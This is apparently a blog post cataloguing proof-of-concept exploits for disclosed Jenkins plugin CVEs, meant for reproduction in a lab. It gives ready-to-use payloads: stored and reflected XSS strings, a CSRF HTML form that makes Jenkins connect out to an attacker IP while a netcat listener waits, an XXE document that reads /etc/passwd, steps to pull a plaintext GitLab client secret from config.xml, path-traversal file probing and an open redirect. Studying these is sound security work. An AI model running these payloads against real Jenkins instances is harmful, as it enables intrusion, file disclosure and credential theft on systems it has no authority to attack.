---
layout: post
title: Jenkins - Vulnerabilities analysis part 4
tags: [Jenkins, Security, CI, CD]
description: "Jenkins - Vulnerabilities analysis part 4"
---

This is still in redaction. I'll add more content when I have found plugins vulnerable and can reproduce the vulnerability. The exploit part will be more verbose, for now that will do :)

The docker image, which will be the lab, with all the plugins already installed, will be available soon.

Search for vulnerable plugins :
- [https://www.jenkins.io/security/advisories/](https://www.jenkins.io/security/advisories/)


## Missing permission

* * *

## XSS
### Stored XSS vulnerability in Dashboard View Plugin
- CVE-2022-27197
	- Dashboard View Plugin 2.18
	- [https://plugins.jenkins.io/dashboard-view/](https://plugins.jenkins.io/dashboard-view/)
	- Requires Jenkins 2.277.1

#### Exploit
- New view - name it - select dashboard
- add a Portlets at the top of the page
- Iframe source url --> javascript:alert("Liodeus")

### Reflected XSS vulnerability in Wall Display Master Project Plugin
- CVE-2019-10376 
	-  Wall Display Master Project 0.6.34
	- [https://plugins.jenkins.io/jenkinswalldisplay/](https://plugins.jenkins.io/jenkinswalldisplay/) 
	- Requires Jenkins 1.580

#### Exploit
- click Wall Display
- `customTheme=</style><script>alert("Liodeus")</script>`

* * *

## CSRF
### CSRF vulnerability in Publish Over SSH Plugin
- CVE-2022-23111 
	- Publish Over SSH Plugin 1.22
	- https://plugins.jenkins.io/publish-over-ssh/
	- Requires Jenkins 2.263.1

#### Exploit
- sudo netcat -lvnp 22
- host this html on a webpage (change the IP by yours)

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:8080/descriptorByName/jenkins.plugins.publish_over_ssh.BapSshHostConfiguration/testConnection">
      <input type="hidden" name="name" value="test" />
      <input type="hidden" name="hostname" value="192&#46;168&#46;1&#46;117" />
      <input type="hidden" name="username" value="test" />
      <input type="hidden" name="port" value="22" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
- Go to the webpage, click on the button Submit request
- If you already are connected to Jenkins, you should see a connection on your listener
- If you are not connected, Jenkins ask you to connect, then the request get executed and you should see a connection on your listener

* * *

## XXE
### XXE vulnerability in Performance Plugin 
- CVE-2021-21701
	- pom2config plugin 1.2
	- [https://plugins.jenkins.io/pom2config/](https://plugins.jenkins.io/pom2config/)
	- Requires Jenkins 1.509.1

#### Exploit
- Create a new freestyle project
- Go on it - click Pom2Config
- Craft a .xml with exploit

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "/etc/passwd" >]>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
  <description>&xxe;</description>
</project>
```

* * *

## Secret stored in plain text
### Client Secret stored in plain text by GitLab Authentication Plugin
- CVE-2022-27206
	- GitLab Authentication Plugin 1.13
	- [https://plugins.jenkins.io/gitlab-oauth/](https://plugins.jenkins.io/gitlab-oauth/)
	- Requires Jenkins 2.249.1

#### Exploit
- Dashboard - Configure Global Security - Security Realm - GitLab Authentication Plugin
- Client ID --> ThisIsASecretID
- Client Secret --> ThisIsASecretPASSWORD
- docker ps - get docker:dind name
- docker exec -it pensive_shannon /bin/bash
- cd /var/jenkins_home
- cat config.xml
- Secret in plain text

* * *

## Path traversal
### Path traversal vulnerability in Publish Over SSH Plugin
- CVE-2022-23113
	- Publish Over SSH Plugin 1.22
	- https://plugins.jenkins.io/publish-over-ssh/
	- Requires Jenkins 2.263.1

#### Exploit
- Manage Jenkins - Configure System - Go to "Publish over SSH"
- In the "Path to key" box, enter a file to check for existance
- If the file doesn't exist on the system : No such file : 'fileName'
- If the file exist : No error

* * *

## Agent-to-controller security bypass

* * *

## Arbitrary file read


## Denial of service

* * *

## Incorrect permission

* * *

## Bonus
### Open redirect vulnerability in GitLab Authentication Plugin 
- CVE-2022-25196
	- GitLab Authentication Plugin 1.13
	- [https://plugins.jenkins.io/gitlab-oauth/](https://plugins.jenkins.io/gitlab-oauth/)
	- Requires Jenkins 2.249.1

#### Exploit
- Dashboard - Configure Global Security - Security Realm - GitLab Authentication Plugin
- GitLab Web URI --> URL
- Save
- Go to localhost:8080
- You are redirect to URL
